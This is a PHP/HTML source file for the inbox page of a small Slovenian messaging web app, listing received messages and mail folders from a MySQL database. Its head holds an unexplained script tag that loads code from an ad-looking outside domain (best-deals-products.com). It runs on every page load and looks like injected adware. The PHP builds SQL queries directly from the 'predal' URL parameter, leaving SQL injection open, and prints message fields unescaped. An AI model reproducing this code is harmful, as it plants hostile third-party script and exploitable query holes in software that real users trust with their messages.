<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Prejeta sporočila</title>

    <!-- Bootstrap core CSS -->
    <link href="bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation" class="active"><a href="profil.php?predal=0">Prejeta sporočila</a></li>
            <li role="presentation"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation"><a href="skupine.php">Ustvari skupino</a></li> 
            <li role="presentation"><a href="predal.php">Ustvari predal</a></li>           
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Prejeta sporočila 
        <?php
          include "povezava.php";
          session_start();
          $id=$_SESSION['id'];
          $sql="select count(t.id_transakcije) from transakcija t inner join uporabnik u on u.id_uporabnika=t.reciever where t.prebrano=0 and t.reciever='$id'";
          $rez=mysqli_query($con,$sql);
          if(mysqli_num_rows($rez) == 1)
            $row = mysqli_fetch_row($rez);
          if($row[0]>0)
          {
           echo '<span class="badge">'; echo ' '.$row[0]; echo '</span>';
          }
          
        ?>
       </h3></div>
		<h4 class="text-muted"><?php echo "Prijavljeni: ". $_SESSION['ime'].' '. $_SESSION['priimek'] .'</br>Zadnja prijava: '.$_SESSION['prijava']; ?></h4>
    Predali:
    <?php
      $sqlpredal = "select id_predala, naziv from predal where id_lastnika='$id'";
      $rezpredal = mysqli_query($con, $sqlpredal);
      echo '<a href="profil.php?predal=0">Vse</a>';
      while($predal = mysqli_fetch_row($rezpredal)){
        echo ' | ';
        echo '<a href="profil.php?predal=' . $predal[0] . '">' . $predal[1] . '</a>'; 
      }
    ?>
      <div class="jumbotron">

        <?php
        if(isset($_SESSION['id']))
        {
          $get_predala = $_GET['predal'];
          $osnutek = "";
          $id = $_SESSION['id']; //da vids ker uporabnik je prjavljen
          if($get_predala == 0){
            echo '<h3>Vsa prejeta</h3>';
            $sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.sender where t.reciever ='$id' order by t.cas desc";
            $sqlvsebina = "select t.zadeva, t.vsebina, t.id_transakcije, t.cas, t.prebrano from transakcija t where t.reciever='$id' order by t.cas desc";
            $recieverrez = mysqli_query($con, $sqlreciever);
            $vsebinarez = mysqli_query($con, $sqlvsebina);
          }
          else{
            $sqlpredal = "select UPPER(p.naziv) from predal p where id_predala='$get_predala'";
            $rezpredal = mysqli_query($con, $sqlpredal);
            $predal = mysqli_fetch_row($rezpredal);
            echo '<h3>' . $predal[0] . '</h3>';
            $sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.sender where t.reciever ='$id' and t.id_predala='$get_predala' order by t.cas desc";
            $sqlvsebina = "select t.zadeva, t.vsebina, t.id_transakcije, t.cas, t.prebrano from transakcija t where t.reciever='$id' and t.id_predala='$get_predala' order by t.cas desc";
            $recieverrez = mysqli_query($con, $sqlreciever);
            $vsebinarez = mysqli_query($con, $sqlvsebina);
          }
          echo '<table class="table">';
          echo '<thead>';
          echo '<tr>';
          echo '<th>Posiljatelj</th>';
          echo '<th>Zadeva</th>';
          echo '<th>Vsebina</th>';
          echo '<th>Čas</th>';
          echo '</tr>';
          echo '</thead>';
          if(mysqli_num_rows($recieverrez) != 0){
            while($reciever = mysqli_fetch_row($recieverrez)){
              $vsebina = mysqli_fetch_row($vsebinarez);
              $words = split(" ", $vsebina[1]);
              for ($i = 0; ($i < 5 && $i < count($words)); $i++) {
              $osnutek .= $words[$i] . " ";
              }
              if($vsebina[4]==0)
              {
                echo '<tr bgcolor="lightgrey">';
                echo '<td>' . $reciever[0] . ' ' . $reciever[1] . '</a></td>';
                echo '<td><strong><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $vsebina[0] . '</a></strong></td>';
                if(str_word_count($osnutek) == 5){
                  echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '...</a></td>';
                }
                else{
                  echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '</a></td>';
                }

                echo '<td>' .  $vsebina[3] . '</td>';
                echo '<td>';
                echo '<a href="izbrisi.php?id=' . $vsebina[2] . '"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></a>';
                echo '</td>';
                echo '</tr>';
                $osnutek = "";
              }
              else
              {
                echo '<tr>';
                echo '<td>' . $reciever[0] . ' ' . $reciever[1] . '</a></td>';
                echo '<td><strong><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $vsebina[0] . '</a></strong></td>';
                if(str_word_count($osnutek) == 5){
                  echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '...</a></td>';
                }
                else{
                  echo '<td><a href="sporocilo1.php?id=' . $vsebina[2] . '">' . $osnutek . '</a></td>';
                }
                echo '<td>' .  $vsebina[3] . '</td>';
                echo '<td>';
                if($get_predala != 0){
                  echo '<a href="izbrisiizpredala.php?id=' . $vsebina[2] . '">Izbrisi iz predala     </a>';
                }
                echo '<a href="izbrisi.php?id=' . $vsebina[2] . '"><span class="glyphicon glyphicon-remove" aria-hidden="true"></span></a>';
                echo '</td>';
                echo '</tr>';
                $osnutek = ""; 
              }
          }
        }
        else{
          echo '</table>V tem predalu nimate sporocil!';
        }
        }
      else
      {
        header( "location:index.php" );
      }
        ?>
      </div>
    </div>
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>